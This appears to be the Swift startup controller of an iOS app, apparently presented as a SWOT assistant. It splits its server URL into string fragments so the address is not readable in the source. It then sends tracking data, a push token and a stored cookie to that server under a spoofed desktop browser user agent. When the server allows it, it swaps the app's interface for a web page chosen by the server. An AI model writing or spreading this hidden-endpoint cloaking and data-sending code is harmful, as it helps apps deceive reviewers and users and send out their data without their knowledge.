import SwiftUI
import Combine
import Firebase
import FirebaseMessaging
import UserNotifications

struct ResponseData: Codable {
    let ok: Bool
    let url: String
    let expires: Int64
    let message: String?
    
    enum CodingKeys: String, CodingKey {
        case ok
        case url
        case expires
        case message
    }
}

class StartingModel: NSObject, ObservableObject {
    static let sharedController = StartingModel()
    
    @Published var currentDisplayState: DisplayState = .initial
    @Published var animationCounter = 0
    @Published var isReadyToProceed = false
    @Published var isWebViewShown = false
    
    private let savedUrlKey = "CACHED_LAST_URL"
    private let launchStatusKey = "APPLICATION_LAUNCH_STATE"
    private let notificationDelayKey = "NOTIFICATION_DELAY_TIME"
    private let fcmTokenKey = "FCM_DEVICE_TOKEN"
    private let pushActiveFlagKey = "PUSH_ACTIVE_STATUS"
    
    private let maxRetryAttempts = 18 * 5
    private let connectionCheckInterval: TimeInterval = 1.0
    
    private var animationUpdateTimer: Timer?
    private var connectionMonitorTimer: Timer?
    private var dataWaitTimer: Timer?
    private var backupTimeoutTimer: Timer?
    private var currentNetworkTask: URLSessionDataTask?
    private var isRequestProcessing = false
    private var endpointSegments: [String] = [
        "ht",
        "tps:",
        "//jo",
        "que",
        "ves",
        "wo",
        "tas",
        "sis",
        "tan",
        "t.",
        "com",
        "/con",
        "fig.",
        "php"
    ]


    private var assembledEndpoint: String = ""
    
    enum DisplayState: Int, CaseIterable {
        case initial = 0
        case notification = 1
        case noConnection = 2
    }
    
    private override init() {
        super.init()
        currentDisplayState = .initial
        setupAnimationTimer()
    }
    
    deinit {
        animationUpdateTimer?.invalidate()
        connectionMonitorTimer?.invalidate()
        dataWaitTimer?.invalidate()
    }
    
    func startApplicationSequence() {
        if let userInfo = UserDefaults.standard.dictionary(forKey: "PENDING_NOTIFICATION_DATA"),
           UserDefaults.standard.bool(forKey: pushActiveFlagKey),
           let urlString = userInfo["url"] as? String {
            UserDefaults.standard.removeObject(forKey: "PENDING_NOTIFICATION_DATA")
            UserDefaults.standard.removeObject(forKey: pushActiveFlagKey)
            stopAllRunningTimers()
            displayWebInterface(url: urlString)
            return
        }
        
        if UserDefaults.standard.dictionary(forKey: "PENDING_NOTIFICATION_DATA") != nil {
            UserDefaults.standard.removeObject(forKey: "PENDING_NOTIFICATION_DATA")
        }
        
        UserDefaults.standard.removeObject(forKey: pushActiveFlagKey)
        
        if UserDefaults.standard.object(forKey: launchStatusKey) != nil {
            navigateToMainApp(delayed: true)
            return
        }
        
        if !checkInternetConnectivity() {
            changeDisplayMode(.noConnection)
            startConnectionWatcher()
            return
        }
        
        waitForTrackingData()
    }
    
    func navigateToMainApp(delayed: Bool = false) {
        UserDefaults.standard.set("launched", forKey: launchStatusKey)
        
        if delayed {
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) {
                self.isReadyToProceed = true
            }
        } else {
            DispatchQueue.main.async {
                self.isReadyToProceed = true
            }
        }
    }
    
    func displayWebInterface(url: String) {
        UserDefaults.standard.removeObject(forKey: "PENDING_NOTIFICATION_DATA")
        UserDefaults.standard.removeObject(forKey: pushActiveFlagKey)
        changeDisplayMode(.initial)
        isWebViewShown = true
        DispatchQueue.main.async {
            if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
               let window = windowScene.windows.first {
                
                var currentViewController = window.rootViewController
                while let presentedVC = currentViewController?.presentedViewController {
                    currentViewController = presentedVC
                }
                
                if let visibleViewController = currentViewController {
                    let webView = WViewModel(viewController: visibleViewController)
                    webView.displayBrowser(url: url) { [weak self] in
                        self?.backupTimeoutTimer?.invalidate()
                        self?.backupTimeoutTimer = nil
                    }
                    
                    self.backupTimeoutTimer = Timer.scheduledTimer(withTimeInterval: 30.0, repeats: false) { [weak self] _ in
                        self?.isWebViewShown = false
                        self?.navigateToMainApp()
                    }
                } else {
                    self.isWebViewShown = false
                    self.navigateToMainApp()
                }
            } else {
                self.isWebViewShown = false
                self.navigateToMainApp()
            }
        }
    }
    
    func stopAllRunningTimers() {
        currentNetworkTask?.cancel()
        connectionMonitorTimer?.invalidate()
        dataWaitTimer?.invalidate()
        backupTimeoutTimer?.invalidate()
        backupTimeoutTimer = nil
    }
    
    func requestPushNotificationPermission() {
        changeDisplayMode(.initial)
        
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .badge, .sound]) { [weak self] granted, error in
            guard let self = self else { return }
            
            DispatchQueue.main.async {
                if let error = error {
                    self.completeConfigurationProcess()
                    return
                }
                
                if granted {
                    Messaging.messaging().delegate = self
                    UNUserNotificationCenter.current().delegate = self
                    UIApplication.shared.registerForRemoteNotifications()
                } else {
                    self.completeConfigurationProcess()
                }
            }
        }
    }
    
    func skipPushNotificationRequest() {
        changeDisplayMode(.initial)
        let nextNotificationTime = Int(Date().timeIntervalSince1970) + 259200
        UserDefaults.standard.set(nextNotificationTime, forKey: notificationDelayKey)
        completeConfigurationProcess()
    }
    
    func resetPushNotificationTimer() {
        UserDefaults.standard.removeObject(forKey: notificationDelayKey)
        UserDefaults.standard.removeObject(forKey: fcmTokenKey)
    }
    
    func changeDisplayMode(_ screen: DisplayState) {
        withAnimation(.easeInOut(duration: 0.5)) {
            currentDisplayState = screen
        }
    }
    
    func setupAnimationTimer() {
        animationUpdateTimer = Timer.scheduledTimer(withTimeInterval: 0.5, repeats: true) { _ in
            withAnimation(.easeInOut(duration: 0.3)) {
                self.animationCounter = (self.animationCounter + 1) % 4
            }
        }
    }
    
    func getLoadingAnimationText() -> String {
        let baseText = "Starting"
        let dots = String(repeating: ".", count: animationCounter)
        return baseText + dots
    }
    
    private func checkInternetConnectivity() -> Bool {
        var isConnected = false
        let semaphore = DispatchSemaphore(value: 0)
        let url = URL(string: "https://www.google.com")!
        let task = URLSession.shared.dataTask(with: url) { (_, _, error) in
            isConnected = error == nil
            semaphore.signal()
        }
        task.resume()
        _ = semaphore.wait(timeout: .now() + 3)
        return isConnected
    }
    
    private func startConnectionWatcher() {
        connectionMonitorTimer = Timer.scheduledTimer(withTimeInterval: connectionCheckInterval, repeats: true) { [weak self] _ in
            guard let self = self else { return }
            if self.checkInternetConnectivity() {
                self.connectionMonitorTimer?.invalidate()
                self.changeDisplayMode(.initial)
                self.waitForTrackingData()
            }
        }
    }
    
    private func waitForTrackingData() {
        var retryCount = 0
        dataWaitTimer = Timer.scheduledTimer(withTimeInterval: 0.1, repeats: true) { [weak self] timer in
            guard let self = self else {
                timer.invalidate()
                return
            }
            retryCount += 1
            if UserDefaults.standard.object(forKey: "ANALYTICS_DATA_STRING") != nil || retryCount >= self.maxRetryAttempts {
                timer.invalidate()
                self.assembledEndpoint = self.endpointSegments.joined()
                self.performNetworkRequest()
            }
        }
    }
    
    private func performNetworkRequest() {
        guard let dataString = UserDefaults.standard.string(forKey: "ANALYTICS_DATA_STRING") else {
            return
        }
        guard let dataDict = try? JSONSerialization.jsonObject(with: dataString.data(using: .utf8)!, options: []) as? [String: Any] else {
            return
        }
        
        var enhancedDataDict = dataDict
        if let notificationToken = UserDefaults.standard.string(forKey: fcmTokenKey), !notificationToken.isEmpty {
            enhancedDataDict["push_token"] = notificationToken
            if enhancedDataDict["firebase_project_id"] == nil {
                enhancedDataDict["firebase_project_id"] = "joqueve-swot-assistant"
            }
            if let enhancedJSON = try? JSONSerialization.data(withJSONObject: enhancedDataDict, options: []),
               let enhancedString = String(data: enhancedJSON, encoding: .utf8) {
                UserDefaults.standard.set(enhancedString, forKey: "ANALYTICS_DATA_STRING")
            }
        }
        
        guard let url = URL(string: assembledEndpoint) else { return }
        
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        let cookie = UserDefaults.standard.string(forKey: "Cookie") ?? ""
        request.addValue(cookie, forHTTPHeaderField: "Set-Cookie")
        request.addValue("application/json", forHTTPHeaderField: "Content-Type")
        request.addValue("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36", forHTTPHeaderField: "User-Agent")
        
        if let callbackString = UserDefaults.standard.string(forKey: "ANALYTICS_DATA_STRING") {
            request.addValue(String(callbackString.count), forHTTPHeaderField: "Content-Length")
            request.httpBody = callbackString.data(using: .utf8)
        }
        request.timeoutInterval = 30
        
        let task = URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
            guard let self = self else { return }
            
            DispatchQueue.main.async(execute: {
                if let error = error {
                    if let previousURL = UserDefaults.standard.string(forKey: self.savedUrlKey) {
                        if self.shouldDisplayNotificationScreen() {
                            self.changeDisplayMode(.notification)
                            return
                        }
                        self.displayWebInterface(url: previousURL)
                        return
                    }
                    self.navigateToMainApp()
                    return
                }
                
                guard let data = data else { return }
                
                do {
                    let decoder = JSONDecoder()
                    let responseData = try decoder.decode(ResponseData.self, from: data)
                    
                    if responseData.ok {
                        UserDefaults.standard.set(responseData.url, forKey: self.savedUrlKey)
                        if self.shouldDisplayNotificationScreen() {
                            self.changeDisplayMode(.notification)
                            return
                        }
                        self.displayWebInterface(url: responseData.url)
                    } else {
                        if let previousURL = UserDefaults.standard.string(forKey: self.savedUrlKey) {
                            if self.shouldDisplayNotificationScreen() {
                                self.changeDisplayMode(.notification)
                                return
                            }
                            self.displayWebInterface(url: previousURL)
                            return
                        }
                        self.navigateToMainApp()
                    }
                } catch {
                    self.navigateToMainApp()
                }
            })
        }
        task.resume()
        currentNetworkTask = task
    }
    
    private func completeConfigurationProcess() {
        guard !isRequestProcessing else { return }
        currentNetworkTask?.cancel()
        connectionMonitorTimer?.invalidate()
        dataWaitTimer?.invalidate()
        isRequestProcessing = true
        performNetworkRequest()
        isRequestProcessing = false
    }
    
    private func shouldDisplayNotificationScreen() -> Bool {
        if UserDefaults.standard.object(forKey: launchStatusKey) != nil {
            return false
        }
        
        let semaphore = DispatchSemaphore(value: 0)
        var hasPermission = false
        
        UNUserNotificationCenter.current().getNotificationSettings { settings in
            hasPermission = settings.authorizationStatus == .authorized
            semaphore.signal()
        }
        
        _ = semaphore.wait(timeout: .now() + 1.0)
        
        if hasPermission {
            return false
        }
        
        if let notificationDelay = UserDefaults.standard.object(forKey: notificationDelayKey) as? Int {
            let currentTime = Int(Date().timeIntervalSince1970)
            if notificationDelay > currentTime {
                return false
            }
        }
        
        return true
    }
}

extension StartingModel: MessagingDelegate {
    func messaging(_ messaging: Messaging, didReceiveRegistrationToken fcmToken: String?) {
        if let token = fcmToken {
            UserDefaults.standard.set(token, forKey: fcmTokenKey)
            performNetworkRequest()
        }
    }
}

extension StartingModel: UNUserNotificationCenterDelegate {
    func userNotificationCenter(_ center: UNUserNotificationCenter, willPresent notification: UNNotification, withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
        completionHandler([.alert, .badge, .sound])
    }
    
    func userNotificationCenter(_ center: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -> Void) {
        let userInfo = response.notification.request.content.userInfo
        if let urlString = userInfo["url"] as? String {
            stopAllRunningTimers()
            displayWebInterface(url: urlString)
        }
        completionHandler()
    }
}
